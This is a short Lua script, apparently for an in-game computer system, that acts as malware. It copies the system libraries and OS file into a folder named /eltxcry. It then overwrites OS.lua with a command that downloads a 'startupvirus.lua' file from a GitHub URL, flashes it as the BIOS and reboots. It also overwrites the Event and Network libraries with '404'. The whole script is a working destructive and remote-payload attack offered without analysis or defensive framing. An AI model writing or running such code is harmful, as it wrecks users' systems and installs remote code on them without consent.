local filesystem = require("filesystem")

-- Move all of data to /eltxcry
filesystem.copy("/Libraries", "/eltxcry/libraries")
filesystem.copy("OS.LUA", "/eltxcry")

-- Write ALL files

filesystem.write("OS.lua", "wget -f https://raw.githubusercontent.com/EletrixtimeYT/ELTXCRY/main/startupvirus.lua /tmp/bios.lua && flash -q /tmp/bios.lua && reboot")
filesystem.write("Libraries/Event.lua", "404")
filesystem.write("Libraries/Network.lua", "404")



